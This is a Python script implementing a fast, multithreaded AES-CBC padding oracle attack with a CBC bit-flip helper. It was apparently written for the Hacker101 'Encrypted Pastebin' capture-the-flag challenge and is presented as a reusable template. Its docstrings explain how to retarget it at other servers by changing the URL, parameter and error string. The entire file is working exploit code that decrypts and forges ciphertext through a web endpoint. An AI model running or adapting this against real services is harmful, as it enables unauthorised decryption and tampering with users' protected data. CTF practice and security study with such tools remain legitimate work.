#!/usr/bin/env python3
"""
Fast AES-CBC padding oracle attack — reusable template.
Cross-block parallelism + stop-on-hit + connection pooling.
Inspired by https://github.com/strozfriedberg/PadBuster

Usage:
    python padbuster.py                          # decrypt with defaults
    python padbuster.py --url URL --blob BLOB    # custom target
    python padbuster.py --burp                   # proxy through Burp (127.0.0.1:8080)

Originally built for Hacker101 CTF "Encrypted Pastebin" challenge.
Adapt ORACLE_URL, BLOB, oracle(), and the base64 alphabet for other targets.
"""
import argparse, base64, requests, threading, time, urllib3, sys
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

# ---- Defaults (override via CLI args) --------------------------------------
DEFAULT_URL  = "https://example.ctf.hacker101.com/"
DEFAULT_BLOB = ""

PER_BLOCK_THREADS  = 4    # parallel guesses per byte position
GLOBAL_CONCURRENCY = 16   # hard cap on simultaneous HTTP requests
BLOCK_SIZE         = 16   # AES block size

# ---- HTTP session with connection pooling ----------------------------------
session = requests.Session()
session.verify = False
adapter = requests.adapters.HTTPAdapter(pool_connections=64, pool_maxsize=64)
session.mount('https://', adapter)
session.mount('http://', adapter)

_global_sem = threading.Semaphore(GLOBAL_CONCURRENCY)

# ---- Base64 helpers (H1 CTF custom alphabet) -------------------------------
# H1 Encrypted Pastebin uses: + -> -,  / -> !,  = -> ~
# Adjust these for other targets or use standard base64.
def b64d(s):
    """Decode from target's custom base64 alphabet."""
    return base64.b64decode(s.replace('~', '=').replace('!', '/').replace('-', '+'))

def b64e(b):
    """Encode to target's custom base64 alphabet."""
    return base64.b64encode(bytes(b)).decode().replace('=', '~').replace('/', '!').replace('+', '-')

# ---- Oracle ----------------------------------------------------------------
def oracle(blob_bytes, url):
    """
    Returns True if padding is valid (server does NOT return a padding error).

    ADAPT THIS for your target:
    - Change the HTTP method (GET/POST) as needed
    - Change the parameter name ("post" here)
    - Change the error detection string ("PaddingException" here)
    - Some oracles use status codes (e.g., 200 = valid, 500 = invalid)
    """
    with _global_sem:
        for attempt in range(5):
            try:
                r = session.get(url, params={"post": b64e(blob_bytes)}, timeout=20)
                if r.status_code == 503:
                    time.sleep(1)
                    continue
                return "PaddingException" not in r.text
            except requests.exceptions.RequestException:
                time.sleep(0.5)
        return True  # assume valid on repeated failure (conservative)

# ---- Single-byte search (stop on first hit) --------------------------------
def find_byte(prev, target, idx, pad, inter, block_id, url):
    """Find the guess value at fake[idx] that produces valid padding."""
    fake_base = bytearray(BLOCK_SIZE)
    for j in range(idx + 1, BLOCK_SIZE):
        fake_base[j] = inter[j] ^ pad

    stop  = threading.Event()
    found = [None]

    def check(g):
        if stop.is_set():
            return
        fake = bytearray(fake_base)
        fake[idx] = g
        if not oracle(bytes(fake) + target, url):
            return
        # False-positive guard: when pad==1, confirm it's really \x01
        # and not \x02\x02 or \x03\x03\x03 etc.
        if pad == 1 and idx >= 1:
            fake2 = bytearray(fake)
            fake2[idx - 1] ^= 1
            if oracle(bytes(fake2) + target, url):
                found[0] = g
                stop.set()
        else:
            found[0] = g
            stop.set()

    with ThreadPoolExecutor(max_workers=PER_BLOCK_THREADS) as ex:
        for g in range(256):
            if stop.is_set():
                break
            ex.submit(check, g)

    if found[0] is None:
        raise RuntimeError(f"block {block_id} idx {idx}: no valid byte found")
    return found[0]

# ---- Decrypt one block -----------------------------------------------------
def decrypt_block(prev, target, block_id, results, url):
    inter = bytearray(BLOCK_SIZE)
    plain = bytearray(BLOCK_SIZE)
    for pad in range(1, BLOCK_SIZE + 1):
        idx = BLOCK_SIZE - pad
        g = find_byte(prev, target, idx, pad, inter, block_id, url)
        inter[idx] = g ^ pad
        plain[idx] = inter[idx] ^ prev[idx]
        ch = chr(plain[idx]) if 32 <= plain[idx] < 127 else '.'
        print(f"  [blk {block_id}] idx {idx:2d} = {plain[idx]:02x} ({ch})", flush=True)
    results[block_id] = bytes(plain)

# ---- CBC bit-flip helper ---------------------------------------------------
def flip(blob_b64, block_index, byte_index, old, new):
    """
    Flip a byte in the ciphertext to change the corresponding plaintext byte.
    XORs the byte in block (block_index - 1) to change plaintext in block_index.

    Example: flip(blob, 2, 5, ord('a'), ord('b'))
    """
    raw = bytearray(b64d(blob_b64))
    raw[(block_index - 1) * BLOCK_SIZE + byte_index] ^= old ^ new
    return b64e(bytes(raw))

# ---- Main ------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="AES-CBC Padding Oracle Attack")
    parser.add_argument("--url", default=DEFAULT_URL, help="Oracle URL")
    parser.add_argument("--blob", default=DEFAULT_BLOB, help="Encrypted blob (custom base64)")
    parser.add_argument("--burp", action="store_true", help="Proxy through Burp (127.0.0.1:8080)")
    parser.add_argument("--threads", type=int, default=PER_BLOCK_THREADS, help="Threads per byte position")
    parser.add_argument("--concurrency", type=int, default=GLOBAL_CONCURRENCY, help="Max concurrent HTTP requests")
    parser.add_argument("-o", "--output", default="plaintext.txt", help="Output file")
    args = parser.parse_args()

    if not args.blob:
        print("[!] No blob provided. Use --blob <encrypted_data>")
        sys.exit(1)

    if args.burp:
        session.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        print("[*] Proxying through Burp Suite (127.0.0.1:8080)")

    global _global_sem, PER_BLOCK_THREADS
    PER_BLOCK_THREADS = args.threads
    _global_sem = threading.Semaphore(args.concurrency)

    t0 = time.time()
    raw = b64d(args.blob)
    blocks = [raw[i:i + BLOCK_SIZE] for i in range(0, len(raw), BLOCK_SIZE)]
    n_cipher = len(blocks) - 1
    print(f"[+] {len(blocks)} blocks total, decrypting {n_cipher} ciphertext blocks in parallel")

    results = {}
    max_block_workers = min(n_cipher, 9)
    with ThreadPoolExecutor(max_workers=max_block_workers) as ex:
        list(ex.map(
            lambda i: decrypt_block(blocks[i - 1], blocks[i], i, results, args.url),
            range(1, len(blocks))
        ))

    plaintext = b''.join(results[i] for i in sorted(results))

    # Strip PKCS#7 padding
    pad = plaintext[-1]
    if 1 <= pad <= BLOCK_SIZE and plaintext.endswith(bytes([pad]) * pad):
        plaintext = plaintext[:-pad]

    elapsed = time.time() - t0
    print(f"\n{'=' * 60}")
    print(f"[+] DONE in {elapsed:.1f}s")
    print(plaintext.decode(errors='replace'))
    print('=' * 60)

    with open(args.output, 'wb') as f:
        f.write(plaintext)
    print(f"[+] Saved to {args.output}")

if __name__ == "__main__":
    main()
